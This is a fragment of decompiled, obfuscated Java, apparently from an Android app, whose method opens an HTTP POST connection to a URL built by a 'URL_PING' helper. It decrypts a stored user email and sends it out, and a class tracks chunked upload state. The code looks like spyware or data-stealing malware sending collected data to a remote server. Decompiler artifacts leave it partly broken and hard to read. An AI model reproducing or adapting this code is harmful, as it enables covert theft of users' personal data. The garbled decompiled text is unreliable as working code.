            var5_13 = var8_12;
            var3_7 = var7_4;
            var4_9 = var6_1;
            if (var8_12.length() > 0) {
                var3_7 = var7_4;
                var4_9 = var6_1;
                var3_7 = var7_4;
                var4_9 = var6_1;
                var5_13 = new StringBuilder();
                var3_7 = var7_4;
                var4_9 = var6_1;
                var5_13 = var5_13.append(var8_12).append("<").toString();
            }
            var3_7 = var7_4;
            var4_9 = var6_1;
            var8_12 = aaskrfyvhoypymnzlskbzwpyr.URL_PING((String)var5_13);
            var3_7 = var7_4;
            var4_9 = var6_1;
            var3_7 = var7_4;
            var4_9 = var6_1;
            var5_13 = new URL(var8_12);
            var3_7 = var7_4;
            var4_9 = var6_1;
            var3_7 = var5_13 = (HttpURLConnection)var5_13.openConnection();
            var4_9 = var5_13;
            var5_13.setRequestMethod("POST");
            var3_7 = var5_13;
            var4_9 = var5_13;
            var5_13.setDoOutput(true);
            var3_7 = var5_13;
            var4_9 = var5_13;
            var5_13.setDoInput(true);
            var3_7 = var5_13;
            var4_9 = var5_13;
            var5_13.setConnectTimeout(30000);
            var3_7 = var5_13;
            var4_9 = var5_13;
            var5_13.setReadTimeout(45000);
            var3_7 = var5_13;
            var4_9 = var5_13;
            var5_13.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            var3_7 = var5_13;
            var4_9 = var5_13;
            var7_4 = tcmypqsdhypcqijjdbpwgzrivmu.Getinstance();
            var3_7 = var5_13;
            var4_9 = var5_13;
            var8_12 = vyklwirattpkwkqagsbrm.Read(etkmbyodxlwuglfdj.Dummyctx, "red_e", lmqhtifjzrtsgjcqpakvh.USR_MAIL);
            var3_7 = var5_13;
            var4_9 = var5_13;
            var3_7 = var5_13;
            var4_9 = var5_13;
            var6_1 = new StringBuilder();
            var3_7 = var5_13;
            var4_9 = var5_13;
            var7_4 = var6_1.append("&user_email=").append(URLEncoder.encode(var7_4.Dcrpt_Str(var8_12), "UTF-8")).toString();
            var3_7 = var5_13;
            var4_9 = var5_13;
            var6_1 = var5_13.getOutputStream();
            var3_7 = new OutputStreamWriter((OutputStream)var6_1, "UTF-8");
            var3_7.write((String)var7_4);
            var3_7.flush();
            var3_7.close();
            if (var6_1 == null) ** GOTO lbl75
            var3_7 = var5_13;
            var4_9 = var5_13;
            var6_1.close();
lbl75:
            // 2 sources

            var3_7 = var5_13;
            var4_9 = var5_13;
            var1_15 = var5_13.getResponseCode();
            if (var1_15 != 200) ** GOTO lbl115
            var3_7 = var5_13;
            var4_9 = var5_13;
            var3_7 = var5_13;
            var4_9 = var5_13;
            var3_7 = var5_13;
            var4_9 = var5_13;
            var7_4 = new InputStreamReader(var5_13.getInputStream());
            var3_7 = var5_13;
            var4_9 = var5_13;
            var6_1 = new BufferedReader((Reader)var7_4);
            var3_7 = new StringBuilder();
            while ((var4_9 = var6_1.readLine()) != null) {
                var3_7.append((String)var4_9);
            }
            var2_16 = this.handleResponse(var3_7.toString());
            var3_7 = var5_13;
            var4_9 = var5_13;
            var6_1.close();
            if (var5_13 == null) return var2_16;
            var5_13.disconnect();
            return var2_16;
            catch (Throwable var7_5) {
                try {
                    var6_1.close();
                    ** GOTO lbl112
                }
                catch (Throwable var6_2) {
                    var3_7 = var5_13;
                    var4_9 = var5_13;
                    var7_5.addSuppressed(var6_2);
lbl112:
                    // 2 sources

                    var3_7 = var5_13;
                    var4_9 = var5_13;
                    throw var7_5;
lbl115:
                    // 1 sources

                    var3_7 = var5_13;
                    var4_9 = var5_13;
                    var3_7 = var5_13;
                    var4_9 = var5_13;
                    var6_1 = new StringBuilder();
                    var3_7 = var5_13;
                    var4_9 = var5_13;
                    var2_17 = this.handleResponse(var6_1.append("HTTP Error: ").append(var1_15).toString());
                    if (var5_13 == null) return var2_17;
                    var5_13.disconnect();
                    return var2_17;
                    catch (Throwable var4_10) {
                        try {
                            var3_7.close();
                            throw var4_10;
                        }
                        catch (Throwable var3_8) {
                            try {
                                var4_10.addSuppressed(var3_8);
                                throw var4_10;
                            }
                            catch (Throwable var7_6) {
                                if (var6_1 == null) ** GOTO lbl145
                                try {
                                    var6_1.close();
                                    ** GOTO lbl145
                                }
                                catch (Throwable var6_3) {
                                    var3_7 = var5_13;
                                    var4_9 = var5_13;
                                    try {
                                        var7_6.addSuppressed(var6_3);
lbl145:
                                        // 3 sources

                                        var3_7 = var5_13;
                                        var4_9 = var5_13;
                                        throw var7_6;
                                    }
                                    catch (Throwable var4_11) {
                                        break block24;
                                    }
                                    catch (Exception var5_14) {
                                        var3_7 = var4_9;
                                        var3_7 = var4_9;
                                        var6_1 = new StringBuilder();
                                        var3_7 = var4_9;
                                        var2_16 = this.handleResponse(var6_1.append("Error: ").append(var5_14.getMessage()).toString());
                                        if (var4_9 == null) return var2_16;
                                        var4_9.disconnect();
                                        return var2_16;
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        if (var3_7 == null) throw var4_11;
        var3_7.disconnect();
        throw var4_11;
    }

    private static class UploadState {
        volatile int chunkNumber = 0;
        volatile boolean finished = false;
        volatile long lastSentSize = 0L;
        volatile int retryCount = 0;

        private UploadState() {
        }
    }
}

